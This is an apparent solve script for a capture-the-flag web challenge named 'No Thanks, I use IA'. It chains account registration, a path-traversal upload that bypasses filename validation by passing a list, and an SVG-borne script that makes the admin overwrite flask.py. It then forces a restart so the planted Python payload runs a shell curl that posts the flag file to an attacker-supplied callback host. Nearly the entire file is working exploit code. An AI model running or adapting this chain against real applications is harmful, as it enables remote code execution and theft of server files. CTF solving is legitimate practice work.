import time
import base64
import secrets
import argparse
import requests


parser = argparse.ArgumentParser(description="No Thanks, I use IA - Solve script")
parser.add_argument("-t", "--target", type=str, default="http://127.0.0.1:5000", help="Target URL")
parser.add_argument("-c", "--callback", type=str, help="Callback URL to receive the flag", required=True)
args = parser.parse_args()

target_url: str = args.target
callback_url: str = args.callback

PYTHON_PAYLOAD = f"""
import os
os.system("sh -c 'curl -X POST {callback_url} -d $(cat /flag-*.txt)'")
"""

JS_PAYLOAD = """
async function exploit() {
    const res = await fetch("/api/messages/flag");
    const messages = await res.json();
    await fetch('/api/admin/files/move', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            filename: 'payload.py',
            newFilename: '../flask.py'
        })
    });
}
exploit();
"""

SVG_PAYLOAD = """
<svg xmlns="http://www.w3.org/2000/svg">
  <script href="/static/payload.js']" />
</svg>
"""

def b64(string: str):
    return base64.b64encode(string.encode()).decode()

s = requests.Session()

s.post(f"{target_url}/api/register", json={
    "username": f"user_{secrets.token_hex(4)}",
    "password": secrets.token_hex(8)
})

s.post(f"{target_url}/api/upload", json={
    "filename": 'payload.py',
    "content": b64(PYTHON_PAYLOAD),
})

# Le filename est une liste pour bypass la validation côté serveur
s.post(f"{target_url}/api/upload", json={
    "filename": ['./../../static/payload.js'],
    "content": b64(JS_PAYLOAD),
})

s.post(f"{target_url}/api/upload", json={
    "filename": 'exploit.svg',
    "content": b64(SVG_PAYLOAD)
})

s.post(f"{target_url}/api/send_message", json={
    "to": "admin",
    "content": 'http://localhost:5000/uploads/exploit.svg',
})

print("Payloads sent, waiting 5s...")

time.sleep(5)

print("Sending 100 requests to make the application restart")

for _ in range(100):
    try:
        s.get(target_url, timeout=1)
    except requests.ConnectTimeout:
        pass
    
print("Done, the flag will be sent to the callback URL within 1 minute")